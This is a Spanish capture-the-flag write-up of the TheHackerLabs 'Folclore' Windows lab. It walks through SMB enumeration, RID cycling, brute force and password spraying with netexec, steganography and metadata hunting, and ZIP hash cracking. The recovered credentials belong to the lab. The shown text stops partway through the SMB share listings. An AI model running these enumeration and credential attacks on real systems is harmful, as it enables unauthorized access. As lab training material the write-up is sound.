---
title: "Folclore - TheHackerLabs"
date: 2026-03-30
draft: false
slug: "THL-writeup-folclore"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos enfocamos en el servicio SMB, ya que después de aplicar RID Cycling attack y de aplicar fuerza bruta a un usuario, logramos obtener su contraseña con la que logramos ver sus recursos compartidos con la herramienta smbmap. Aquí encontraremos una imagen que contendrá un mensaje oculto en sus metadatos, siendo así que encontramos otra contraseña de otro usuario, al que llamaremos usuario2. En los archivos compartidos del usuario2, encontraremos un archivo de texto que contiene una pista y la contraseña del usuario3. En los archivos compartidos del usuario3, encontraremos una imagen que contiene un mensaje oculto gracias a la esteganografía aplicada, pues dicho mensaje contiene la contraseña del usuario4. En sus archivos compartidos, encontraremos un archivo de texto que contiene la contraseña del usuario5 y un archivo ZIP, que al crackearlo, nos dará otras pistas que resultan ser para la contraseña de un usuario principal. Al descubrir la contraseña del usuario principal y ver sus archivos compartidos, vemos solo un archivo de texto que contiene un mensaje sobre cómo obtener una Reverse Shell. Al ganar acceso a la máquina víctima, encontraremos la contraseña en texto claro del administrador, lo que nos permite conectarnos de manera remota usando psexec, siendo así que escalamos privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Windows", "SMB", "SMB Enumeration", "RID Cycling Attack", "Brute Force Attack", "Metadata Analysis", "Steganography", "Password Spraying", "Cracking Hash", "Cracking ZIP File", "Abusing Local PowerShell Functionality", "Privilege Escalation via Exposed Administrator Credentials in Plaintext File", "Privesc - Privilege Escalation via Exposed Administrator Credentials in Plaintext File", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "netexec"
  - "smbmap"
  - "file"
  - "exiftool"
  - "strings"
  - "head"
  - "stegseek"
  - "7z"
  - "zip2john"
  - "JohnTheRipper"
  - "hashcat"
  - "wget"
  - "rlwrap"
  - "nc"
  - "smbclient"
  - "impacket-psexec"
links:
  - "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"
  - "https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-folclore/folclore.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.100.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 09:53 -0600
...
Nmap scan report for 192.168.100.230
Host is up (0.0016s latency).
MAC Address: XX:XX:XX:XX:XX:XX (Oracle VirtualBox virtual NIC)
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.100.0/24
Interface: eth0, type: EN10MB, MAC: XX:XX:XX:XX:XX:XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.100.230	XX:XX:XX:XX:XX:XX	PCS Systemtechnik GmbH
...
```

Encontramos nuestro objetivo y es: `192.168.100.230`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.230
PING 192.168.100.230 (192.168.100.230) 56(84) bytes of data.
64 bytes from 192.168.100.230: icmp_seq=1 ttl=128 time=2.86 ms
64 bytes from 192.168.100.230: icmp_seq=2 ttl=128 time=0.978 ms
64 bytes from 192.168.100.230: icmp_seq=3 ttl=128 time=2.00 ms
64 bytes from 192.168.100.230: icmp_seq=4 ttl=128 time=1.16 ms

--- 192.168.100.230 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 0.978/1.748/2.856/0.747 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.230 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 09:55 -0600
Initiating ARP Ping Scan at 09:55
Scanning 192.168.100.230 [1 port]
Completed ARP Ping Scan at 09:55, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:55
Scanning 192.168.100.230 [65535 ports]
Discovered open port 445/tcp on 192.168.100.230
Discovered open port 139/tcp on 192.168.100.230
Discovered open port 7680/tcp on 192.168.100.230
Completed SYN Stealth Scan at 09:56, 42.29s elapsed (65535 total ports)
Nmap scan report for 192.168.100.230
Host is up, received arp-response (0.0015s latency).
Scanned at 2026-03-27 09:55:25 CST for 43s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
139/tcp  open  netbios-ssn  syn-ack ttl 128
445/tcp  open  microsoft-ds syn-ack ttl 128
7680/tcp open  pando-pub    syn-ack ttl 128
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.48 seconds
           Raw packets sent: 131070 (5.767MB) | Rcvd: 6 (248B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay 3 puertos abiertos y me da curiosidad el **puerto 7680**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 139,445,7680 192.168.100.230 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 09:58 -0600
Nmap scan report for 192.168.100.230
Host is up (0.0024s latency).

PORT     STATE SERVICE       VERSION
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
7680/tcp open  pando-pub?
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: -1s
|_nbstat: NetBIOS name: FOLCLORE, NetBIOS user: <unknown>, NetBIOS MAC: XX (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-03-27T15:59:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.81 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Si bien no vemos información sobre el **puerto 7680**, podemos ver algunos puntos sobre el **servicio SMB**:
* Parece que está usando **SMB 3.1.1**, que es una versión moderna.
* El mensaje **"Message signing enabled but not required"** quiere decir que requiere firmado en cada paquete enviado a **SMB**; sin embargo, menciona que esto es opcional, lo que permitiría ataques como **Fuerza Bruta**, **Ataque SMB Relay**, etc.

A su vez, parece que la explotación estará enfocada en **SMB**, así que comencemos con la enumeración.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio SMB y Aplicando RID Cycling Attack {#SMB}

Primero veamos más información sobre este servicio con **netexec**:
```bash
nxc smb 192.168.100.230
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
```
Vemos a qué versión de **Windows** nos enfrentamos, pero hay algo interesante.

Curiosamente, el mensaje de **"signing:False"** pareciera indicar que no es necesario dar credenciales para ver los archivos compartidos, pero al intentar esto, no obtendremos ningún resultado, por lo que sí o sí son necesarias credenciales válidas.

Veamos si podemos enumerar los archivos compartidos con el usuario invitado:
```bash
smbmap -H 192.168.100.230 -u 'guest' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: 192.168.100.230       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	NO ACCESS	Al final, todos somos polvo y hueso.
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	NO ACCESS	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	Lluvia                                            	NO ACCESS	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	Oro                                               	NO ACCESS	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	Santuario                                         	NO ACCESS	El Refugio de Ixchel
	Viento                                            	NO ACCESS	El viento sagrado ejecutará la tarea a su debido tiempo
[*] Closed 1 connections
```
Excelente, vemos varios directorios, pero no tenemos acceso para ver alguno.

Podríamos tratar de aplicar fuerza bruta, pero desconocemos cuáles son los usuarios existentes.

Es por esto que la mejor opción es aplicar un **RID Brute Forcing** o mejor conocido como **RID Cycling Attack**:

| **RID Cycling Attack** |
|:----------------------:|
| *Un RID Cycling Attack es una técnica de enumeración en entornos Windows/Active Directory usada en pruebas de penetración para descubrir usuarios válidos sin autenticarse correctamente. La idea es “ciclar” (probar) múltiples RIDs para ver cuáles existen en el sistema.* |

Al aplicarlo, podremos ver los usuarios existentes en la máquina y lo haremos con **netexec**:
```bash
nxc smb 192.168.100.230 -u 'guest' -p '' --rid-brute
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\guest: (Guest)
SMB         192.168.100.230   445    FOLCLORE         500: FOLCLORE\Administrador (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         501: FOLCLORE\Invitado (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         503: FOLCLORE\DefaultAccount (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         504: FOLCLORE\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         513: FOLCLORE\Ninguno (SidTypeGroup)
SMB         192.168.100.230   445    FOLCLORE         1001: FOLCLORE\Quetzalcoatl (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         1003: FOLCLORE\El_charro_negro (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         1004: FOLCLORE\Ix_Chel (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         1005: FOLCLORE\Tlaloc (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         1006: FOLCLORE\La_mulata_de_Cordoba (SidTypeUser)
SMB         192.168.100.230   445    FOLCLORE         1007: FOLCLORE\La_Catrina (SidTypeUser)
```
Excelente, tenemos a varios usuarios.

Intentemos aplicar **Fuerza Bruta** a algunos de estos.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio SMB y Obteniendo Contraseña de Usuario El_charro_negro {#FuerzaBruta}

**IMPORTANTE**:

A partir de este momento, podremos encontrar contraseñas que ya hayan expirado dentro de la máquina, por lo que tendremos que cambiar cada una a una de nuestra preferencia.

----------

Probando entre varios usuarios, con un ataque de mínimo 10 minutos, encontramos la contraseña del siguiente usuario:
```bash
nxc smb 192.168.100.230 -u 'El_charro_negro' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep -E '\[\+\]|STATUS_PASSWORD_EXPIRED'
SMB                      192.168.100.230   445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED
```
Encontramos la contraseña, pero tenemos que cambiarla.

Una vez que la cambiemos, probemos la nueva credencial:
```bash
nxc smb 192.168.100.230 -u 'El_charro_negro' -p 'abcd123'
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\El_charro_negro:abcd12
```
Funciona.

Revisando los archivos compartidos, veremos que tenemos permisos de lectura y escritura en el directorio **Oro**:
```bash
smbmap -H 192.168.100.230 -u 'El_charro_negro' -p 'abcd123' -r Oro --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: lavashop.thl        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	NO ACCESS	Al final, todos somos polvo y hueso.
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	NO ACCESS	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	Lluvia                                            	NO ACCESS	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	Oro                                               	READ, WRITE	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	./Oro
	dr--r--r--                0 Sun Mar 29 23:35:19 2026	.
	dr--r--r--                0 Sun Mar 29 23:35:19 2026	..
	fr--r--r--            50061 Mon Jul 28 18:40:26 2025	El_Charro_Negro.jpeg
	Santuario                                         	NO ACCESS	El Refugio de Ixchel
	Viento                                            	NO ACCESS	El viento sagrado ejecutará la tarea a su debido tiempo
```

Encontramos una imagen, así que descarguémosla:
```bash
smbmap -H 192.168.100.230 -u 'El_charro_negro' -p 'abcd123' --download Oro/El_charro_Negro.jpeg --no-banner

mv 192.168.100.230-Oro_El_charro_Negro.jpeg El_charro_Negro.jpeg
```

Veamos la imagen:

<p align="center">
<img src="/assets/images/THL-writeup-folclore/Captura1.png">
</p>

Qué fregona se ve, pero toca analizarla, ya que da la impresión de que pueda tener algo oculto.

### Identificando Mensaje Oculto en Metadatos de Imagen y Obteniendo Contraseña de Usuario Ixchel y Tlaloc {#metadatos}

Analizando el tipo de archivo con el comando **file**, podremos ver un mensaje:
```bash
file El_charro_Negro.jpeg
El_charro_Negro.jpeg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=2, copyright=El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK], progressive, precision 8, 736x981, components 3
```

Aunque lo podremos ver mejor si usamos la herramienta **exiftool** que sirve para ver los metadatos de un archivo:
```bash
exiftool El_charro_Negro.jpeg
ExifTool Version Number         : 13.44
File Name                       : El_charro_Negro.jpeg
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2026:03:29 23:35:40-06:00
File Access Date/Time           : 2026:03:29 23:35:59-06:00
File Inode Change Date/Time     : 2026:03:29 23:35:54-06:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Y Cb Cr Positioning             : Centered
Copyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK
Image Width                     : 736
Image Height                    : 981
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x981
Megapixels                      : 0.722
```
Tenemos la contraseña del **usuario Ixchel**. (Recuerda cambiarla si aparece como caducada)

Probemos la contraseña:
```bash
nxc smb 192.168.100.230 -u 'Ix_Chel' -p 'ixchel123'
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\Ix_Chel:ixchel123
```

Este usuario tiene permisos de lectura y escritura en el directorio **Santuario**:
```bash
smbmap -H 192.168.100.230 -u 'Ix_Chel' -p 'ixchel123' -r Santuario --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: lavashop.thl        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	NO ACCESS	Al final, todos somos polvo y hueso.
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	NO ACCESS	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	Lluvia                                            	NO ACCESS	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	Oro                                               	NO ACCESS	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	Santuario                                         	READ, WRITE	El Refugio de Ixchel
	./Santuario
	dr--r--r--                0 Sun Mar 29 23:46:27 2026	.
	dr--r--r--                0 Sun Mar 29 23:46:27 2026	..
	fr--r--r--              573 Mon Jul 28 18:59:58 2025	La clave de Kukulcán.txt
	Viento                                            	NO ACCESS	El viento sagrado ejecutará la tarea a su debido tiempo
[*] Closed 1 connections
```
Dentro, vemos un archivo de texto.

Descarguémoslo:
```bash
smbmap -H 192.168.100.230 -u 'Ix_Chel' -p 'ixchel123' --download 'Santuario/La clave de kukulcán.txt' --no-banner

mv 192.168.100.230-Santuario_La\ clave\ de\ kukulcán.txt La_clave_de_kukulcán.txt
```

Ahora, veamos su contenido:
```bash
cat La_clave_de_kukulcán.txt
Recuerdo cuando conocí a Kukulcán, la serpiente emplumada que otros llaman Quetzalcóatl; su mirada guardaba el misterio del viento y la sabiduría, y con una sonrisa me confió que su clave más preciada tenía solo ocho caracteres, sencilla pero poderosa, como él mismo. Nuestros caminos se entrelazan: yo, guardiana de la luna y la vida; él, portador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. Ahora, sigue adelante, porque Quetzalcóatl te espera. Continua buscando a Tláloc,te despejare el camino entregándote su clave: 677Kn$q."
```
Este mensaje, aparte de ser muy poético, nos da dos datos importantes:
* La contraseña del **usuario Quetzalcoatl** tiene 8 caracteres.
* Nos da la contraseña del **usuario Tlaloc**.

Por ahora, guardemos bien el dato del **usuario Quetzalcoatl** y probemos la contraseña del **usuario Tlaloc**:
```bash
nxc smb 192.168.100.230 -u 'Tlaloc' -p 'tlaloc123'
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\Tlaloc:tlaloc123
```
Funciona.

Este usuario tiene permisos de lectura y escritura en el directorio **Lluvia**:
```bash
smbmap -H 192.168.100.230 -u 'Tlaloc' -p 'tlaloc123' -r Lluvia --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: lavashop.thl        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	NO ACCESS	Al final, todos somos polvo y hueso.
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	NO ACCESS	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	Lluvia                                            	READ, WRITE	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	./Lluvia
	dr--r--r--                0 Mon Mar 30 00:33:39 2026	.
	dr--r--r--                0 Mon Mar 30 00:33:39 2026	..
	fr--r--r--           111216 Mon Jul 28 19:35:18 2025	Tlaloc.jpg
	Oro                                               	NO ACCESS	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	Santuario                                         	NO ACCESS	El Refugio de Ixchel
	Viento                                            	NO ACCESS	El viento sagrado ejecutará la tarea a su debido tiempo
[*] Closed 1 connections
```
Dentro, podemos encontrar una imagen.

Descarguémosla:
```bash
smbmap -H 192.168.100.230 -u 'Tlaloc' -p 'tlaloc123' --download Lluvia/Tlaloc.jpg --no-banner

mv 192.168.100.230-Lluvia_Tlaloc.jpg Lluvia_Tlaloc.jpg
```

Y ahora veámosla:

<p align="center">
<img src="/assets/images/THL-writeup-folclore/Captura2.png">
</p>

Tremenda obra de arte, pero también tendremos que analizar esta imagen.

### Identificando Esteganografía en Imagen, Aplicación de Password Spraying y Obteniendo Contraseña del Usuario La_mulata_de_Cordoba y La_Catrina {#Steganography}

Veamos si el comando **file** muestra algo de información extra sobre la imagen:
```bash
file Lluvia_Tlaloc.jpg
Lluvia_Tlaloc.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 736x731, components 3
```
No hay más.

Pero si analizamos la imagen con el comando **strings**, podremos ver unos patrones que nos dan la pista sobre el uso de esteganografía en la imagen:
```bash
strings Lluvia_Tlaloc.jpg | head -n 10
JFIF
 , #&')*)
-0-(0%()(
((((((((((((((((((((((((((((((((((((((((((((((((((
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
2+^5
QKI@
```

Para descubrir qué se ocultó dentro de la imagen, usaremos la herramienta **stegseek** y usaremos el wordlist **rockyou.txt** por si se utilizó una contraseña para poder extraer el contenido oculto:
```bash
stegseek Lluvia_Tlaloc.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "knight"
[i] Original filename: "Las primeras señales.txt".
[i] Extracting to "Lluvia_Tlaloc.jpg.out".
```
Excelente, obtuvimos la contraseña que se usó y vemos el archivo que se obtuvo.

Leámoslo:
```bash
cat Lluvia_Tlaloc.jpg.out
He conseguido estos últimos dos caracteres para la clave de Kukulcán, la serpiente emplumada que llaman Quetzalcóatl: %/. Te los entrego para que completes tu búsqueda. Además, aquí tienes otra clave, aunque debo confesar que no recuerdo a quién pertenece exactamente: 45yD#k7. Confía en tu instinto para usarla sabiamente.
```

Muy bien, tenemos otro mensaje que nos da dos pistas:
* Los últimos dos caracteres de la contraseña del **usuario Quetzalcoatl**.
* La contraseña de algún usuario.

Guardemos el dato del **usuario Quetzalcoatl** y para descubrir a quién le pertenece esa contraseña, podemos aplicar **Pasword Spraying** a los usuarios de los que no tenemos su contraseña:
```bash
nxc smb 192.168.100.230 -u usuarios.txt -p '45yD#k7' --no-bruteforce --continue-on-success
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [-] Folclore\Administrador:45yD#k7 STATUS_LOGON_FAILURE 
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\Ninguno:45yD#k7 (Guest)
SMB         192.168.100.230   445    FOLCLORE         [-] Folclore\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED 
SMB         192.168.100.230   445    FOLCLORE         [-] Folclore\La_Catrina:45yD#k7 STATUS_LOGON_FAILURE
```
Bien, la contraseña pertenece al **usuario La_mulata_de_Cordoba**. (Recuerda cambiarla)

Comprobemos si funciona:
```bash
nxc smb 192.168.100.230 -u 'La_mulata_de_Cordoba' -p 'cordoba123'
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\La_mulata_de_Cordoba:cordoba123
```

Este usuario tiene permisos de lectura y escritura en el directorio **Libertad**:
```bash
smbmap -H 192.168.100.230 -u 'La_mulata_de_Cordoba' -p 'cordoba123' -r Libertad --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: lavashop.thl        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	NO ACCESS	Al final, todos somos polvo y hueso.
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	READ, WRITE	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	./Libertad
	dr--r--r--                0 Mon Mar 30 01:06:55 2026	.
	dr--r--r--                0 Mon Mar 30 01:06:55 2026	..
	fr--r--r--              169 Mon Jul 28 19:54:06 2025	Mi_amiga.txt
	fr--r--r--              432 Mon Jul 28 19:49:18 2025	Pacto.zip
	Lluvia                                            	NO ACCESS	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	Oro                                               	NO ACCESS	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	Santuario                                         	NO ACCESS	El Refugio de Ixchel
	Viento                                            	NO ACCESS	El viento sagrado ejecutará la tarea a su debido tiempo
[*] Closed 1 connections
```
Podemos ver que tiene 2 archivos.

Descarguémoslos:
```bash
smbmap -H 192.168.100.230 -u 'La_mulata_de_Cordoba' -p 'cordoba123' --download Libertad/Mi_amiga.txt --no-banner
smbmap -H 192.168.100.23 -u 'La_mulata_de_Cordoba' -p 'cordoba123' --download Libertad/Pacto.zip --no-banner
```

Veamos primero el archivo de texto:
```bash
cat Mi_amiga.txt
Mi amiga ‘La Catrina’ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. Escribiré la clave aquí para no olvidarla: 3nM93{S#
```
Excelente, tenemos la contraseña del **usuario La_Catrina**.

Si intentamos descomprimir el archivo comprimido, nos pedirá una contraseña, por lo que debemos encontrarla:
```bash
7z x Pacto.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=es_MX.UTF-8 Threads:6 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 432 bytes (1 KiB)

Extracting archive: Pacto.zip
--
Path = Pacto.zip
Type = zip
Physical Size = 432

    
Enter password (will not be echoed):
```

#### Crackeando Archivo ZIP y Probando Contraseña del Usuario La_Catrina {#CrackingZIP}

Para poder crackear el **archivo ZIP**, debemos obtener su hash y eso lo haremos con la herramienta **zip2john**:
```bash
zip2john Pacto.zip > zipHash
```

Este Hash nos sirve para utilizar la herramienta **JohnTheRipper**, pues el Hash ya tiene un formato que acepta esta herramienta, por lo que podrá crackearlo y así obtendremos la contraseña:
```bash
john -w:/usr/share/wordlists/rockyou.txt zipHash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 238 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********           (Pacto.zip/Pacto.txt)     
1g 0:00:00:00 DONE (2026-03-30 09:57) 6.666g/s 81920p/s 81920c/s 81920C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Descomprimamos el **archivo ZIP**:
```bash
7z x Pacto.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=es_MX.UTF-8 Threads:6 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 432 bytes (1 KiB)

Extracting archive: Pacto.zip
--
Path = Pacto.zip
Type = zip
Physical Size = 432

    
Enter password (will not be echoed):
Everything is Ok

Size:       358
Compressed: 43
```
Nos dio un archivo de texto.

Leámoslo:
```bash
cat Pacto.txt
Has surcado sendas que pocos se atreven a cruzar, pero tu viaje no concluye todavía. Invocando mis artes prohibidas, logré hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: sólo tres caracteres fui capaz de obtener. Ahora los deposito en tus manos, pero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.
```
Otro mensaje poético, pero que viene con una pista importante, siendo los 3 primeros caracteres de la contraseña del **usuario Quetzalcoat**.

Guardemos este dato y probemos la contraseña del **usuario La_Catrina**:
```bash
nxc smb 192.168.100.230 -u 'La_Catrina' -p 'catrina123'
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\La_Catrina:catrina123
```
Funciona.

Este usuario tiene permisos de lectura y escritura en el directorio **Dia de Muertos**:
```bash
smbmap -H 192.168.100.230 -u 'La_Catrina' -p 'catrina123' -r 'Dia de Muertos' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: lavashop.thl        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	READ, WRITE	Al final, todos somos polvo y hueso.
	./Dia de Muertos
	dr--r--r--                0 Mon Mar 30 01:16:04 2026	.
